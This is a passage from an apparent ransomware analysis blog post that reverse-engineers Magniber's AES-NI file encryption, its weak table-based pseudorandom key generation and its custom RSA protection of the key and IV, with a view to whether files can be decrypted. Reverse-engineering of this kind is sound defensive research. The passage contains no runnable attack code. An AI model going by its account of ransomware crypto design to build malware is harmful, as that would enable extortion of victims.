<p>Having the tags generated by Tiny Tracer, we can apply them into IDA, or Ghidra, using the tools mentioned <a href="https://github.com/hasherezade/tiny_tracer/wiki/Using-the-TAGs-with-disassemblers-and-debuggers">here</a>. </p>



<p>I loaded the Tags into IDA, using IFL plugin, and renamed the functions with syscalls accordingly to what system function do they execute.</p>



<figure class="wp-block-image size-full"><img data-attachment-id="8894" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/tags_applied/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/tags_applied.png" data-orig-size="777,724" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="tags_applied" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/tags_applied.png?w=322" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/tags_applied.png?w=640" loading="lazy" width="777" height="724" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/tags_applied.png" alt="" class="wp-image-8894" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/tags_applied.png 777w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/tags_applied.png?w=150&amp;h=140 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/tags_applied.png?w=322&amp;h=300 322w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/tags_applied.png?w=768&amp;h=716 768w" sizes="(max-width: 777px) 100vw, 777px" /></figure>



<p>Now we can follow the interesting functions by their references, to see the whole code context in which they are executed.</p>



<p>When we come in contact with a new ransomware, often the first questions we ask is, if it is decryptable, and what is the scale of the damage done. In order to know it, we will analyze what algorithm is used, how the keys are generated, how the keys are protected, etc. </p>



<h3 class="wp-block-heading">Encryption algorithm</h3>



<p>The function responsible for file encryption can be found by following the references of <code>NtReadFile</code>.</p>



<p>Between the reads and the writes into a file (<code>NtReadFile</code> and <code>NtWriteFile</code>) we can find how the read chunk is being encrypted:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="8901" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/file_enc_algo/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_enc_algo.png" data-orig-size="736,756" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="file_enc_algo" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_enc_algo.png?w=292" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_enc_algo.png?w=640" loading="lazy" width="736" height="756" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_enc_algo.png" alt="" class="wp-image-8901" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_enc_algo.png 736w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_enc_algo.png?w=146&amp;h=150 146w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/file_enc_algo.png?w=292&amp;h=300 292w" sizes="(max-width: 736px) 100vw, 736px" /></figure>



<p>Most of the ransomware authors use AES for file encryption. Magniber follows this trend. But the intresting part is the implementation. Instead of using a common implementation that works at a higher abstraction level (and i.e. leverage some of the known libraries, or Windows Crypto API as the old Magniber did) authors made a bold choice to go for a low-level one, via the (relatively) new Intel instructions for AES encryption (<a rel="noreferrer noopener" href="https://www.intel.com/content/www/us/en/developer/articles/technical/advanced-encryption-standard-instructions-aes-ni.html" target="_blank">AES-NI extension</a>). Using AES-NI allows for much faster encryption, but the cost of is to drop the backward compatibility with older machines that don&#8217;t support it. As well it makes the used algorithm obvious at first look at the assembly, which is not neccessarily beneficial from the malware author&#8217;s perspective.</p>



<p>First, the key is initialized by the function that also has AES-NI based implementation (referenced as <code>aes_low_level_keygen</code>):</p>



<figure class="wp-block-image size-full"><img data-attachment-id="8909" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/init_key/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_key.png" data-orig-size="725,954" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="init_key" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_key.png?w=228" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_key.png?w=640" loading="lazy" width="725" height="954" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_key.png" alt="" class="wp-image-8909" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_key.png 725w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_key.png?w=114&amp;h=150 114w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_key.png?w=228&amp;h=300 228w" sizes="(max-width: 725px) 100vw, 725px" /></figure>



<p>We can see the AES-NI instruction <a href="https://www.felixcloutier.com/x86/aeskeygenassist" target="_blank" rel="noreferrer noopener">AESKEYGENASSIST</a> used in order to prepare the AES context.</p>



<p>Then we can see how the next chunk of data is loaded, and encrypted by consecutive AES rounds, using the instruction <a href="https://www.felixcloutier.com/x86/aesenc" target="_blank" rel="noreferrer noopener">AESENC</a>. At the end, an instruction <a href="https://www.felixcloutier.com/x86/aesenclast" target="_blank" rel="noreferrer noopener">AESENCLAST</a> is used to finalize the encryption.</p>



<figure class="wp-block-image size-full"><img data-attachment-id="8914" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/aes_round/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/aes_round.png" data-orig-size="484,213" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="aes_round" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/aes_round.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/aes_round.png?w=484" loading="lazy" width="484" height="213" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/aes_round.png" alt="" class="wp-image-8914" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/aes_round.png 484w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/aes_round.png?w=150&amp;h=66 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/aes_round.png?w=400&amp;h=176 400w" sizes="(max-width: 484px) 100vw, 484px" /></figure>



<h3 class="wp-block-heading">AES key generation</h3>



<p>The next important point is to check how the AES key gets generated. </p>



<h4 class="wp-block-heading">The random generator</h4>



<p>By observing the flow earlier on, I started to suspect that the function <code><a href="https://learn.microsoft.com/is-is/windows/win32/devnotes/ntqueryperformancecounter">NtQueryPerformanceCounter</a></code> is used as a source of entropy, to initialize all sort of pseudorandom variables. Indeed, this native function is incorporated in a function made for generating random values:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="8995" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/make_pseurorandom/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_pseurorandom.png" data-orig-size="779,349" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="make_pseurorandom" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_pseurorandom.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_pseurorandom.png?w=640" loading="lazy" width="779" height="349" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_pseurorandom.png?w=779" alt="" class="wp-image-8995" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_pseurorandom.png 779w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_pseurorandom.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_pseurorandom.png?w=400 400w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_pseurorandom.png?w=768 768w" sizes="(max-width: 779px) 100vw, 779px" /></figure>



<p>The function has the following prototype, allowing to supply the range from which the random number should be selected:</p>



<pre class="wp-block-code"><code>__int64 __fastcall make_pseudo_random(unsigned int min, unsigned int max);</code></pre>



<p>The function comes with a table of 100 pseudorandom DWORDs. Then, a simple algorithm making use of <code><a href="https://learn.microsoft.com/is-is/windows/win32/devnotes/ntqueryperformancecounter">NtQueryPerformanceCounter</a></code> is executed, in order to select a random index from this table. Basing on the value from the table at this index, and the given min and max values, the final pseudorandom value is calculated. In case if the calculated value failed to fit in the range, a new attempt is made recursively.</p>



<p>The interesting point at this moment is, that the random value is selected in fact from the hardcoded table. So, if we consider that our random value must be of size 1 byte, then, instead of the typical range of 255 options to select from, the range of options narrows down to 100 which is the table size. </p>



<p>Note, that we can see some general similarities with the analogous function from the old edition of Magniber, yet the implementation differs:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="9017" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/dga_part0/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dga_part0.png" data-orig-size="632,203" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="dga_part0" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dga_part0.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dga_part0.png?w=632" loading="lazy" width="632" height="203" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dga_part0.png" alt="" class="wp-image-9017" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dga_part0.png 632w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dga_part0.png?w=150&amp;h=48 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dga_part0.png?w=400&amp;h=128 400w" sizes="(max-width: 632px) 100vw, 632px" /></figure>



<p><em>The random generator used in the old Magniber (2017)</em></p>



<p>Yet, in the old version this random generator is not used to derive the keys.</p>



<p>We must note that neither <code><a rel="noreferrer noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount" target="_blank">GetTickCount</a>,</code> nor <code><a href="https://learn.microsoft.com/is-is/windows/win32/devnotes/ntqueryperformancecounter">NtQueryPerformanceCounter</a></code> is a cryptographicaly secure source of entropy. In both cases, the values generated are incremental, not random, and relative to the system start. Yet, <code>GetTickCount</code> has lower resolution, so finding the initial value that started the series (seed) is much easier. </p>



<h3 class="wp-block-heading">Generating AES key and IV</h3>



<p>The aforementioned function is used in multiple places in the code, but what interests us the most at this point, is that is is used for the generation of AES key and IV used for files encryption:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="8931" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/make_aes_key-1/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_aes_key-1.png" data-orig-size="685,453" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="make_aes_key-1" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_aes_key-1.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_aes_key-1.png?w=640" loading="lazy" width="685" height="453" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_aes_key-1.png?w=685" alt="" class="wp-image-8931" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_aes_key-1.png 685w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_aes_key-1.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/make_aes_key-1.png?w=400 400w" sizes="(max-width: 685px) 100vw, 685px" /></figure>



<p>Both AES key and IV are 16 bytes long, which makes it AES 128.</p>



<p>The range from which the values are selected is 1 to 254, which is yet more narrow than typical 0 to 255.</p>



<p>I conducted and experiment by hooking the function, and checking what is the possible set of the values of one pseudorandom byte from this range. It turns out, that this set has only 67 elements (unlike 255, as it would be for the full BYTE range):</p>



<pre class="wp-block-preformatted">{ 5, 9, f, 13, 15, 1d, 20, 23, 2f, 31, 33, 35, 37, 39, 3d, 3f, 41, 45, 47, 49, 4b, 55, 59, 5b, 5d, 61, 62, 63, 64, 69, 6b, 6c, 6f, 72, 79, 7e, 7f, 81, 83, 87, 8f, 90, 91, 93, 97, 99, 9d, 9f, a1, a7, ab, af, b3, c1, c3, cb, cd, d5, e1, e5, e7, e9, eb, f3, f4, f7, fb }</pre>



<p>So, in order to generate the key, we are selecting 16 values out of the 67 elements set, which gives 67^16 permutations. It gives 1.6489096e+29. So, although the key is a bit weakened, it is still impossible to brutforce.</p>



<p>Generated AES key and IV:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="8981" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/maybe_key/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_key.png" data-orig-size="675,265" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="maybe_key" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_key.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_key.png?w=640" loading="lazy" width="675" height="265" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_key.png" alt="" class="wp-image-8981" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_key.png 675w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_key.png?w=150&amp;h=59 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_key.png?w=400&amp;h=157 400w" sizes="(max-width: 675px) 100vw, 675px" /></figure>



<figure class="wp-block-image size-full"><img data-attachment-id="8978" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/maybe_iv/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_iv.png" data-orig-size="708,329" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="maybe_iv" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_iv.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_iv.png?w=640" loading="lazy" width="708" height="329" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_iv.png" alt="" class="wp-image-8978" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_iv.png 708w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_iv.png?w=150&amp;h=70 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/maybe_iv.png?w=400&amp;h=186 400w" sizes="(max-width: 708px) 100vw, 708px" /></figure>



<p>We can further confirm that the generated key was used to initialize the AES context:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="8979" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/init_aes_key-1/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_aes_key-1.png" data-orig-size="656,276" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="init_aes_key-1" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_aes_key-1.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_aes_key-1.png?w=640" loading="lazy" width="656" height="276" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_aes_key-1.png" alt="" class="wp-image-8979" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_aes_key-1.png 656w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_aes_key-1.png?w=150&amp;h=63 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/init_aes_key-1.png?w=400&amp;h=168 400w" sizes="(max-width: 656px) 100vw, 656px" /></figure>



<p>By supplying the dumped data to <a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noreferrer noopener">CyberChef</a>, we can confirm that it is a valid implementation of AES 128, and the used mode is CBC . </p>



<p>The same cipher was used by the old Magniber&#8217;s edition: yet, its implementation, as well as key generation was very different.</p>



<h3 class="wp-block-heading">Protecting AES key and IV</h3>



<p>Even if the AES key and IV have been generated properly, there is still one point of a possible weakness, and that is about how they are protected.</p>



<p>After the encrypted chunks of the file are being written, there is yet another call to <code>NtWriteFile</code>. This time it is used to save the encrypted AES key and IV. </p>



<figure class="wp-block-image size-full"><img data-attachment-id="9002" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/asym_crypto/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asym_crypto.png" data-orig-size="765,377" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="asym_crypto" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asym_crypto.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asym_crypto.png?w=640" loading="lazy" width="765" height="377" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asym_crypto.png" alt="" class="wp-image-9002" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asym_crypto.png 765w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asym_crypto.png?w=150&amp;h=74 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asym_crypto.png?w=400&amp;h=197 400w" sizes="(max-width: 765px) 100vw, 765px" /></figure>



<p>The algorithm used to protect them seems to be a custom implementation of RSA (we will verify its correctness further on).</p>



<figure class="wp-block-image size-large"><img data-attachment-id="9006" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/protect_key_and_iv-1/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/protect_key_and_iv-1.png" data-orig-size="596,284" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="protect_key_and_iv-1" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/protect_key_and_iv-1.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/protect_key_and_iv-1.png?w=596" loading="lazy" width="596" height="284" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/protect_key_and_iv-1.png?w=596" alt="" class="wp-image-9006" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/protect_key_and_iv-1.png 596w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/protect_key_and_iv-1.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/protect_key_and_iv-1.png?w=400 400w" sizes="(max-width: 596px) 100vw, 596px" /></figure>



<p><em>The generated key and IV are stored together in a buffer, and then passed to the asymmetric crypto function.</em></p>



<p>The ransomware uses attacker&#8217;s public key that is hardcoded in the binary:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="8983" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/hardcoded_rsa_key/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/hardcoded_rsa_key.png" data-orig-size="621,348" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="hardcoded_rsa_key" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/hardcoded_rsa_key.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/hardcoded_rsa_key.png?w=621" loading="lazy" width="621" height="348" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/hardcoded_rsa_key.png?w=621" alt="" class="wp-image-8983" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/hardcoded_rsa_key.png 621w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/hardcoded_rsa_key.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/hardcoded_rsa_key.png?w=400 400w" sizes="(max-width: 621px) 100vw, 621px" /></figure>



<p>The public key is copied and passed to the function:</p>



<figure class="wp-block-image size-large"><img data-attachment-id="9008" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/load_master_key/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/load_master_key.png" data-orig-size="620,540" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="load_master_key" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/load_master_key.png?w=344" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/load_master_key.png?w=620" loading="lazy" width="620" height="540" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/load_master_key.png?w=620" alt="" class="wp-image-9008" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/load_master_key.png 620w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/load_master_key.png?w=150 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/load_master_key.png?w=344 344w" sizes="(max-width: 620px) 100vw, 620px" /></figure>



<p>Once the buffer containing the AES key and IV is passed to the function, the random padding is appended to it:</p>



<figure class="wp-block-image size-full"><img data-attachment-id="9040" data-permalink="https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/asymmetric_crypto-4/" data-orig-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asymmetric_crypto-4.png" data-orig-size="759,410" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="asymmetric_crypto-4" data-image-description="" data-image-caption="" data-medium-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asymmetric_crypto-4.png?w=400" data-large-file="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asymmetric_crypto-4.png?w=640" loading="lazy" width="759" height="410" src="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asymmetric_crypto-4.png" alt="" class="wp-image-9040" srcset="https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asymmetric_crypto-4.png 759w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asymmetric_crypto-4.png?w=150&amp;h=81 150w, https://hshrzd.wordpress.com/wp-content/uploads/2023/03/asymmetric_crypto-4.png?w=400&amp;h=216 400w" sizes="(max-width: 759px) 100vw, 759px" /></figure>



<p>Inside the function denoted as <code>apply_assymmetric_crypto</code> we can see some <a rel="noreferrer noopener" href="https://www.dcode.fr/rsa-cipher" target="_blank">building blocks typical for RSA</a>:</p>



